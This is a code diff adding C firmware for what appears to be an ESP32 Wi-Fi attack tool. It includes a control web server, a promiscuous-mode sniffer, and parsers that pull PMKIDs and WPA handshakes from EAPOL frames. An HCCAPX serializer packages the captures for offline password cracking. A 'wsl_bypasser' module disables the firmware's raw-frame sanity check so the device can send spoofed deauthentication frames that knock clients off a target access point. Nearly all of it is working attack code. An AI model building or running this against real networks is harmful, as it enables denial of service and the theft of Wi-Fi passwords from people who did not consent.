+ESP_LOGD(TAG, "Fetching attack status...");
+const attack_status_t *attack_status;
+attack_status = attack_get_status();
+ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+ESP_ERROR_CHECK(httpd_resp_send_chunk(req, (char *) attack_status, 4));
+if(((attack_status->state == FINISHED) || (attack_status->state == TIMEOUT)) && (attack_status->content_size > 0)){
+ESP_ERROR_CHECK(httpd_resp_send_chunk(req, attack_status->content, attack_status->content_size));
+}
+return httpd_resp_send_chunk(req, NULL, 0);
+}
+static httpd_uri_t uri_status_get = {
+.uri = "/status",
+.method = HTTP_GET,
+.handler = uri_status_get_handler,
+.user_ctx = NULL
+};
+static esp_err_t uri_capture_pcap_get_handler(httpd_req_t *req){
+ESP_LOGD(TAG, "Providing PCAP file...");
+ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+return httpd_resp_send(req, (char *) pcap_serializer_get_buffer(), pcap_serializer_get_size());
+}
+static httpd_uri_t uri_capture_pcap_get = {
+.uri = "/capture.pcap",
+.method = HTTP_GET,
+.handler = uri_capture_pcap_get_handler,
+.user_ctx = NULL
+};
+static esp_err_t uri_capture_hccapx_get_handler(httpd_req_t *req){
+ESP_LOGD(TAG, "Providing HCCAPX file...");
+ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+return httpd_resp_send(req, (char *) hccapx_serializer_get(), sizeof(hccapx_t));
+}
+static httpd_uri_t uri_capture_hccapx_get = {
+.uri = "/capture.hccapx",
+.method = HTTP_GET,
+.handler = uri_capture_hccapx_get_handler,
+.user_ctx = NULL
+};
+void webserver_run(){
+ESP_LOGD(TAG, "Running webserver");
+httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+httpd_handle_t server = NULL;
+ESP_ERROR_CHECK(httpd_start(&server, &config));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_root_get));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_reset_head));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_ap_list_get));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_run_attack_post));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_status_get));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_capture_pcap_get));
+ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_capture_hccapx_get));
+}
+=== FILE: components/frame_analyzer/frame_analyzer.c ===
+#include "frame_analyzer.h"
+#include <stdint.h>
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "wifi_controller.h"
+#include "frame_analyzer_parser.h"
+static const char *TAG = "frame_analyzer";
+static uint8_t target_bssid[6];
+static search_type_t search_type = -1;
+static void data_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+ESP_LOGV(TAG, "Handling DATA frame");
+wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
+if(!is_frame_bssid_matching(frame, target_bssid)){
+ESP_LOGV(TAG, "Not matching BSSIDs.");
+return;
+}
+eapol_packet_t *eapol_packet = parse_eapol_packet((data_frame_t *) frame->payload);
+if(eapol_packet == NULL){
+ESP_LOGV(TAG, "Not an EAPOL packet.");
+return;
+}
+eapol_key_packet_t *eapol_key_packet = parse_eapol_key_packet(eapol_packet);
+if(eapol_key_packet == NULL){
+ESP_LOGV(TAG, "Not an EAPOL-Key packet");
+return;
+}
+if(search_type == SEARCH_HANDSHAKE){
+ESP_ERROR_CHECK_WITHOUT_ABORT(esp_event_post(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, frame, sizeof(wifi_promiscuous_pkt_t) + frame->rx_ctrl.sig_len, portMAX_DELAY));
+return;
+}
+if(search_type == SEARCH_PMKID){
+pmkid_item_t *pmkid_items;
+if((pmkid_items = parse_pmkid(eapol_key_packet)) == NULL){
+return;
+}
+ESP_ERROR_CHECK(esp_event_post(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_items, sizeof(pmkid_item_t *), portMAX_DELAY));
+return;
+}
+}
+void frame_analyzer_capture_start(search_type_t search_type_arg, const uint8_t *bssid){
+ESP_LOGI(TAG, "Frame analysis started...");
+search_type = search_type_arg;
+memcpy(&target_bssid, bssid, 6);
+ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA, &data_frame_handler, NULL));
+}
+void frame_analyzer_capture_stop(){
+ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &data_frame_handler));
+}
+=== FILE: components/frame_analyzer/frame_analyzer_parser.c ===
+#include "frame_analyzer_parser.h"
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include "arpa/inet.h"
+#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
+#include "esp_log.h"
+#include "esp_wifi_types.h"
+#include "frame_analyzer_types.h"
+static const char *TAG = "frame_analyzer:parser";
+ESP_EVENT_DEFINE_BASE(FRAME_ANALYZER_EVENTS);
+void print_raw_frame(const wifi_promiscuous_pkt_t *frame){
+for(unsigned i = 0; i < frame->rx_ctrl.sig_len; i++) {
+printf("%02x", frame->payload[i]);
+}
+printf("\n");
+}
+void print_mac_address(const uint8_t *a){
+printf("%02x:%02x:%02x:%02x:%02x:%02x",
+a[0], a[1], a[2], a[3], a[4], a[5]);
+printf("\n");
+}
+bool is_frame_bssid_matching(wifi_promiscuous_pkt_t *frame, uint8_t *bssid) {
+data_frame_mac_header_t *mac_header = (data_frame_mac_header_t *) frame->payload;
+return memcmp(mac_header->addr3, bssid, 6) == 0;
+}
+eapol_packet_t *parse_eapol_packet(data_frame_t *frame) {
+uint8_t *frame_buffer = frame->body;
+if(frame->mac_header.frame_control.protected_frame == 1) {
+ESP_LOGV(TAG, "Protected frame, skipping...");
+return NULL;
+}
+if(frame->mac_header.frame_control.subtype > 7) {
+ESP_LOGV(TAG, "QoS data frame");
+frame_buffer += 2;
+}
+frame_buffer += sizeof(llc_snap_header_t);
+if(ntohs(*(uint16_t *) frame_buffer) == ETHER_TYPE_EAPOL) {
+ESP_LOGD(TAG, "EAPOL packet");
+frame_buffer += 2;
+return (eapol_packet_t *) frame_buffer;
+}
+return NULL;
+}
+eapol_key_packet_t *parse_eapol_key_packet(eapol_packet_t *eapol_packet){
+if(eapol_packet->header.packet_type != EAPOL_KEY){
+ESP_LOGD(TAG, "Not an EAPoL-Key packet.");
+return NULL;
+}
+return (eapol_key_packet_t *) eapol_packet->packet_body;
+}
+static pmkid_item_t *parse_pmkid_from_key_data(uint8_t *key_data, const uint16_t length){
+uint8_t *key_data_index = key_data;
+uint8_t *key_data_max_index = key_data + length;
+pmkid_item_t *pmkid_item_head = NULL;
+key_data_field_t *key_data_field;
+do{
+key_data_field = (key_data_field_t *) key_data_index;
+ESP_LOGV(TAG, "EAPOL-Key -> Key-Data -> type=%x; length=%x; oui=%x; data_type=%x",
+key_data_field->type,
+key_data_field->length,
+key_data_field->oui,
+key_data_field->data_type);
+if(key_data_field->type != KEY_DATA_TYPE){
+ESP_LOGD(TAG, "Wrong type %x (expected %x)", key_data_field->type, KEY_DATA_TYPE);
+continue;
+}
+if(ntohl(key_data_field->oui) != KEY_DATA_OUI_IEEE80211){
+ESP_LOGD(TAG, "Wrong OUI %x (expected %x)", key_data_field->oui, KEY_DATA_OUI_IEEE80211);
+continue;
+}
+if(key_data_field->data_type != KEY_DATA_DATA_TYPE_PMKID_KDE){
+ESP_LOGD(TAG, "Wrong data type %x (expected %x)", key_data_field->data_type, KEY_DATA_DATA_TYPE_PMKID_KDE);
+continue;
+}
+ESP_LOGI(TAG, "Found PMKID: ");
+pmkid_item_t *pmkid_item = (pmkid_item_t *) malloc(sizeof(pmkid_item_t));
+pmkid_item->next = pmkid_item_head;
+pmkid_item_head = pmkid_item;
+for(unsigned i = 0; i < 16; i++){
+pmkid_item->pmkid[i] = key_data_field->data[i];
+printf("%02x", pmkid_item->pmkid[i]);
+}
+printf("\n");
+} while((key_data_index = key_data_field->data + key_data_field->length - 4 + 1) < key_data_max_index);
+return pmkid_item_head;
+}
+pmkid_item_t *parse_pmkid(eapol_key_packet_t *eapol_key){
+if(eapol_key->key_data_length == 0){
+ESP_LOGD(TAG, "Empty Key Data");
+return NULL;
+}
+if(eapol_key->key_information.encrypted_key_data == 1){
+ESP_LOGD(TAG, "Key Data encrypted");
+return NULL;
+}
+return parse_pmkid_from_key_data(eapol_key->key_data, ntohs(eapol_key->key_data_length));
+}
+=== FILE: components/hccapx_serializer/hccapx_serializer.c ===
+#include "hccapx_serializer.h"
+#include <stdint.h>
+#include <string.h>
+#include <arpa/inet.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
+#include "esp_log.h"
+#include "esp_err.h"
+#include "frame_analyzer.h"
+#include "frame_analyzer_types.h"
+#include "frame_analyzer_parser.h"
+#define HCCAPX_SIGNATURE 0x58504348
+#define HCCAPX_VERSION 4
+#define HCCAPX_KEYVER_WPA 1
+#define HCCAPX_KEYVER_WPA2 2
+#define HCCAPX_MAX_EAPOL_SIZE 256
+static char *TAG = "hccapx_serializer";
+static hccapx_t hccapx = {
+.signature = HCCAPX_SIGNATURE,
+.version = 4,
+.message_pair = 255,
+.keyver = HCCAPX_KEYVER_WPA2
+};
+static unsigned message_ap = 0;
+static unsigned message_sta = 0;
+static unsigned eapol_source = 0;
+static bool is_array_zero(uint8_t *array, unsigned size){
+for(unsigned i = 0; i < size; i++){
+if(array[i] != 0){
+return false;
+}
+}
+return true;
+}
+void hccapx_serializer_init(const uint8_t *ssid, unsigned size){
+hccapx.essid_len = size;
+memcpy(hccapx.essid, ssid, size);
+hccapx.message_pair = 255;
+}
+hccapx_t *hccapx_serializer_get(){
+if(hccapx.message_pair == 255){
+return NULL;
+}
+return &hccapx;
+}
+static unsigned save_eapol(eapol_packet_t *eapol_packet, eapol_key_packet_t *eapol_key_packet){
+unsigned eapol_len = 0;
+eapol_len = sizeof(eapol_packet_header_t) + ntohs(eapol_packet->header.packet_body_length);
+if(eapol_len > HCCAPX_MAX_EAPOL_SIZE){
+ESP_LOGW(TAG, "EAPoL is too long (%u/%u)", eapol_len, HCCAPX_MAX_EAPOL_SIZE);
+return 1;
+}
+hccapx.eapol_len = eapol_len;
+memcpy(hccapx.eapol, eapol_packet, hccapx.eapol_len);
+memcpy(hccapx.keymic, eapol_key_packet->key_mic, 16);
+memset(&hccapx.eapol[81], 0x0, 16);
+return 0;
+}
+static void ap_message_m1(eapol_key_packet_t *eapol_key_packet){
+ESP_LOGD(TAG, "From AP M1");
+message_ap = 1;
+memcpy(hccapx.nonce_ap, eapol_key_packet->key_nonce, 32);
+}
+static void ap_message_m3(eapol_packet_t* eapol_packet, eapol_key_packet_t *eapol_key_packet){
+ESP_LOGD(TAG, "From AP M3");
+message_ap = 3;
+if(message_ap == 0){
+memcpy(hccapx.nonce_ap, eapol_key_packet->key_nonce, 32);
+}
+if(eapol_source == 2){
+hccapx.message_pair = 2;
+return;
+}
+if(save_eapol(eapol_packet, eapol_key_packet) != 0){
+return;
+}
+eapol_source = 3;
+if(message_sta == 2){
+hccapx.message_pair = 3;
+}
+}
+static void ap_message(data_frame_t *frame, eapol_packet_t* eapol_packet, eapol_key_packet_t *eapol_key_packet){
+if((!is_array_zero(hccapx.mac_sta, 6)) && (memcmp(frame->mac_header.addr1, hccapx.mac_sta, 6) != 0)){
+ESP_LOGE(TAG, "Different STA");
+return;
+}
+if(message_ap == 0){
+memcpy(hccapx.mac_ap, frame->mac_header.addr2, 6);
+}
+if(is_array_zero(eapol_key_packet->key_mic, 16)){
+ap_message_m1(eapol_key_packet);
+}
+else {
+ap_message_m3(eapol_packet, eapol_key_packet);
+}
+}
+static void sta_message_m2(eapol_packet_t* eapol_packet, eapol_key_packet_t *eapol_key_packet){
+ESP_LOGD(TAG, "From STA M2");
+message_sta = 2;
+memcpy(hccapx.nonce_sta, eapol_key_packet->key_nonce, 32);
+if(save_eapol(eapol_packet, eapol_key_packet) != 0){
+return;
+}
+eapol_source = 2;
+if(message_ap == 1){
+hccapx.message_pair = 0;
+return;
+}
+}
+static void sta_message_m4(eapol_packet_t* eapol_packet, eapol_key_packet_t *eapol_key_packet){
+ESP_LOGD(TAG, "From STA M4");
+if((message_sta == 2) && (eapol_source != 0)){
+ESP_LOGD(TAG, "Already have M2, not worth");
+return;
+}
+if(message_ap == 0){
+ESP_LOGE(TAG, "Not enought handshake messages received.");
+return;
+}
+if(eapol_source == 3){
+hccapx.message_pair = 4;
+return;
+}
+if(save_eapol(eapol_packet, eapol_key_packet) != 0){
+return;
+}
+eapol_source = 4;
+if(message_ap == 1){
+hccapx.message_pair = 1;
+}
+if(message_ap == 3){
+hccapx.message_pair = 5;
+}
+}
+static void sta_message(data_frame_t *frame, eapol_packet_t* eapol_packet, eapol_key_packet_t *eapol_key_packet){
+if(is_array_zero(hccapx.mac_sta, 6)){
+memcpy(hccapx.mac_sta, frame->mac_header.addr2, 6);
+}
+else if(memcmp(frame->mac_header.addr2, hccapx.mac_sta, 6) != 0){
+ESP_LOGE(TAG, "Different STA");
+return;
+}
+if(!is_array_zero(eapol_key_packet->key_nonce, 16)){
+sta_message_m2(eapol_packet, eapol_key_packet);
+}
+else {
+sta_message_m4(eapol_packet, eapol_key_packet);
+}
+}
+void hccapx_serializer_add_frame(data_frame_t *frame){
+eapol_packet_t *eapol_packet = parse_eapol_packet(frame);
+eapol_key_packet_t *eapol_key_packet = parse_eapol_key_packet(eapol_packet);
+if(memcmp(frame->mac_header.addr2, frame->mac_header.addr3, 6) == 0){
+ap_message(frame, eapol_packet, eapol_key_packet);
+}
+else if(memcmp(frame->mac_header.addr1, frame->mac_header.addr3, 6) == 0){
+sta_message(frame, eapol_packet, eapol_key_packet);
+}
+else {
+ESP_LOGE(TAG, "Unknown frame format. BSSID is not source nor destionation.");
+}
+}
+=== FILE: components/pcap_serializer/pcap_serializer.c ===
+#include "pcap_serializer.h"
+#include <stdint.h>
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+static const char *TAG = "pcap_serializer";
+#define SNAPLEN 65535
+#define PCAP_MAGIC_NUMBER 0xa1b2c3d4
+#define LINKTYPE_IEEE802_11 105
+static unsigned pcap_size = 0;
+static uint8_t *pcap_buffer = NULL;
+uint8_t *pcap_serializer_init(){
+free(pcap_buffer);
+pcap_global_header_t pcap_global_header = {
+.magic_number = PCAP_MAGIC_NUMBER,
+.version_major = 2,
+.version_minor = 4,
+.thiszone = 0,
+.sigfigs = 0,
+.snaplen = SNAPLEN,
+.network = LINKTYPE_IEEE802_11
+};
+pcap_buffer = (uint8_t *)malloc(sizeof(pcap_global_header_t));
+pcap_size = sizeof(pcap_global_header_t);
+memcpy(pcap_buffer, &pcap_global_header, sizeof(pcap_global_header_t));
+return pcap_buffer;
+}
+void pcap_serializer_append_frame(const uint8_t *buffer, unsigned size, unsigned ts_usec){
+if(size == 0){
+ESP_LOGD(TAG, "Frame size is 0. Not appending anything.");
+return;
+}
+pcap_record_header_t pcap_record_header = {
+.ts_sec = ts_usec / 1000000,
+.ts_usec = ts_usec % 1000000,
+.incl_len = size,
+.orig_len = size,
+};
+if(size > SNAPLEN){
+size = SNAPLEN;
+pcap_record_header.incl_len = SNAPLEN;
+}
+uint8_t *reallocated_pcap_buffer = realloc(pcap_buffer, pcap_size + sizeof(pcap_record_header_t) + size);
+if(reallocated_pcap_buffer == NULL){
+ESP_LOGE(TAG, "Error reallocating PCAP buffer! PCAP buffer may not be complete.");
+return;
+}
+memcpy(&reallocated_pcap_buffer[pcap_size], &pcap_record_header, sizeof(pcap_record_header_t));
+memcpy(&reallocated_pcap_buffer[pcap_size + sizeof(pcap_record_header_t)], buffer, size);
+pcap_buffer = reallocated_pcap_buffer;
+pcap_size += sizeof(pcap_record_header_t) + size;
+}
+void pcap_serializer_deinit(){
+free(pcap_buffer);
+pcap_buffer = NULL;
+pcap_size = 0;
+}
+unsigned pcap_serializer_get_size(){
+return pcap_size;
+}
+uint8_t *pcap_serializer_get_buffer(){
+return pcap_buffer;
+}
+=== FILE: components/wifi_controller/ap_scanner.c ===
+#include "ap_scanner.h"
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_wifi.h"
+static const char* TAG = "wifi_controller/ap_scanner";
+static wifictl_ap_records_t ap_records;
+void wifictl_scan_nearby_aps(){
+ESP_LOGD(TAG, "Scanning nearby APs...");
+ap_records.count = CONFIG_SCAN_MAX_AP;
+wifi_scan_config_t scan_config = {
+.ssid = NULL,
+.bssid = NULL,
+.channel = 0,
+.scan_type = WIFI_SCAN_TYPE_ACTIVE
+};
+ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
+ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_records.count, ap_records.records));
+ESP_LOGI(TAG, "Found %u APs.", ap_records.count);
+ESP_LOGD(TAG, "Scan done.");
+}
+const wifictl_ap_records_t *wifictl_get_ap_records() {
+return &ap_records;
+}
+const wifi_ap_record_t *wifictl_get_ap_record(unsigned index) {
+if(index > ap_records.count){
+ESP_LOGE(TAG, "Index out of bounds! %u records available, but %u requested", ap_records.count, index);
+return NULL;
+}
+return &ap_records.records[index];
+}
+=== FILE: components/wifi_controller/ap_scanner.h ===
+#ifndef AP_SCANNER_H
+#define AP_SCANNER_H
+#include "esp_wifi_types.h"
+typedef struct {
+uint16_t count;
+wifi_ap_record_t records[CONFIG_SCAN_MAX_AP];
+} wifictl_ap_records_t;
+void wifictl_scan_nearby_aps();
+const wifictl_ap_records_t *wifictl_get_ap_records();
+const wifi_ap_record_t *wifictl_get_ap_record(unsigned index);
+#endif
+=== FILE: components/wifi_controller/sniffer.c ===
+#include "sniffer.h"
+#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "esp_wifi.h"
+#include "esp_wifi_types.h"
+static const char *TAG = "sniffer";
+ESP_EVENT_DEFINE_BASE(SNIFFER_EVENTS);
+static void frame_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
+ESP_LOGV(TAG, "Captured frame %d.", (int) type);
+wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) buf;
+int32_t event_id;
+switch (type) {
+case WIFI_PKT_DATA:
+event_id = SNIFFER_EVENT_CAPTURED_DATA;
+break;
+case WIFI_PKT_MGMT:
+event_id = SNIFFER_EVENT_CAPTURED_MGMT;
+break;
+case WIFI_PKT_CTRL:
+event_id = SNIFFER_EVENT_CAPTURED_CTRL;
+break;
+default:
+return;
+}
+ESP_ERROR_CHECK(esp_event_post(SNIFFER_EVENTS, event_id, frame, frame->rx_ctrl.sig_len + sizeof(wifi_promiscuous_pkt_t), portMAX_DELAY));
+}
+void wifictl_sniffer_filter_frame_types(bool data, bool mgmt, bool ctrl) {
+wifi_promiscuous_filter_t filter = { .filter_mask = 0 };
+if(data) {
+filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
+}
+else if(mgmt) {
+filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_MGMT;
+}
+else if(ctrl) {
+filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_CTRL;
+}
+esp_wifi_set_promiscuous_filter(&filter);
+}
+void wifictl_sniffer_start(uint8_t channel) {
+ESP_LOGI(TAG, "Starting promiscuous mode...");
+ESP_LOGD(TAG, "Kicking all connected STAs from AP");
+ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
+esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+esp_wifi_set_promiscuous(true);
+esp_wifi_set_promiscuous_rx_cb(&frame_handler);
+}
+void wifictl_sniffer_stop() {
+ESP_LOGI(TAG, "Stopping promiscuous mode...");
+esp_wifi_set_promiscuous(false);
+}
+=== FILE: components/wifi_controller/sniffer.h ===
+#ifndef SNIFFER_H
+#define SNIFFER_H
+#include <stdbool.h>
+#include "esp_event.h"
+ESP_EVENT_DECLARE_BASE(SNIFFER_EVENTS);
+enum {
+SNIFFER_EVENT_CAPTURED_DATA,
+SNIFFER_EVENT_CAPTURED_MGMT,
+SNIFFER_EVENT_CAPTURED_CTRL
+};
+void wifictl_sniffer_filter_frame_types(bool data, bool mgmt, bool ctrl);
+void wifictl_sniffer_start(uint8_t channel);
+void wifictl_sniffer_stop();
+#endif
+=== FILE: components/wifi_controller/wifi_controller.c ===
+#include "wifi_controller.h"
+#include <stdio.h>
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_wifi.h"
+#include "esp_wifi_types.h"
+#include "esp_netif.h"
+#include "esp_event.h"
+static const char* TAG = "wifi_controller";
+static bool wifi_init = false;
+static uint8_t original_mac_ap[6];
+static void wifi_event_handler(void *event_handler_arg, esp_event_base_t event_base, int32_t event_id, void *event_data){
+}
+static void wifi_init_apsta(){
+ESP_ERROR_CHECK(esp_netif_init());
+esp_netif_create_default_wifi_ap();
+esp_netif_create_default_wifi_sta();
+wifi_init_config_t wifi_init_config = WIFI_INIT_CONFIG_DEFAULT();
+ESP_ERROR_CHECK(esp_wifi_init(&wifi_init_config));
+ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
+ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL));
+ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, original_mac_ap));
+ESP_ERROR_CHECK(esp_wifi_start());
+wifi_init = true;
+}
+void wifictl_ap_start(wifi_config_t *wifi_config) {
+ESP_LOGD(TAG, "Starting AP...");
+if(!wifi_init){
+wifi_init_apsta();
+}
+ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, wifi_config));
+ESP_LOGI(TAG, "AP started with SSID=%s", wifi_config->ap.ssid);
+}
+void wifictl_ap_stop(){
+ESP_LOGD(TAG, "Stopping AP...");
+wifi_config_t wifi_config = {
+.ap = {
+.max_connection = 0
+},
+};
+ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
+ESP_LOGD(TAG, "AP stopped");
+}
+void wifictl_mgmt_ap_start(){
+wifi_config_t mgmt_wifi_config = {
+.ap = {
+.ssid = CONFIG_MGMT_AP_SSID,
+.ssid_len = strlen(CONFIG_MGMT_AP_SSID),
+.password = CONFIG_MGMT_AP_PASSWORD,
+.max_connection = CONFIG_MGMT_AP_MAX_CONNECTIONS,
+.authmode = WIFI_AUTH_WPA2_PSK
+},
+};
+wifictl_ap_start(&mgmt_wifi_config);
+}
+void wifictl_sta_connect_to_ap(const wifi_ap_record_t *ap_record, const char password[]){
+ESP_LOGD(TAG, "Connecting STA to AP...");
+if(!wifi_init){
+wifi_init_apsta();
+}
+wifi_config_t sta_wifi_config = {
+.sta = {
+.channel = ap_record->primary,
+.scan_method = WIFI_FAST_SCAN,
+.pmf_cfg.capable = false,
+.pmf_cfg.required = false
+},
+};
+mempcpy(sta_wifi_config.sta.ssid, ap_record->ssid, 32);
+if(password != NULL){
+if(strlen(password) >= 64) {
+ESP_LOGE(TAG, "Password is too long. Max supported length is 64");
+return;
+}
+memcpy(sta_wifi_config.sta.password, password, strlen(password) + 1);
+}
+ESP_LOGD(TAG, ".ssid=%s", sta_wifi_config.sta.ssid);
+ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &sta_wifi_config));
+ESP_ERROR_CHECK(esp_wifi_connect());
+}
+void wifictl_sta_disconnect(){
+ESP_ERROR_CHECK(esp_wifi_disconnect());
+}
+void wifictl_set_ap_mac(const uint8_t *mac_ap){
+ESP_LOGD(TAG, "Changing AP MAC address...");
+ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, mac_ap));
+}
+void wifictl_get_ap_mac(uint8_t *mac_ap){
+esp_wifi_get_mac(WIFI_IF_AP, mac_ap);
+}
+void wifictl_restore_ap_mac(){
+ESP_LOGD(TAG, "Restoring original AP MAC address...");
+ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, original_mac_ap));
+}
+void wifictl_get_sta_mac(uint8_t *mac_sta){
+esp_wifi_get_mac(WIFI_IF_STA, mac_sta);
+}
+void wifictl_set_channel(uint8_t channel){
+if((channel == 0) || (channel >  13)){
+ESP_LOGE(TAG,"Channel out of range. Expected value from <1,13> but got %u", channel);
+return;
+}
+esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
+=== FILE: components/wsl_bypasser/wsl_bypasser.c ===
+#include "wsl_bypasser.h"
+#include <stdint.h>
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_wifi.h"
+#include "esp_wifi_types.h"
+static const char *TAG = "wsl_bypasser";
+static const uint8_t deauth_frame_default[] = {
+0xc0, 0x00, 0x3a, 0x01,
+0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0xf0, 0xff, 0x02, 0x00
+};
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+return 0;
+}
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
+ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+}
+void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
+ESP_LOGD(TAG, "Sending deauth frame...");
+uint8_t deauth_frame[sizeof(deauth_frame_default)];
+memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+memcpy(&deauth_frame[10], ap_record->bssid, 6);
+memcpy(&deauth_frame[16], ap_record->bssid, 6);
+wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+}
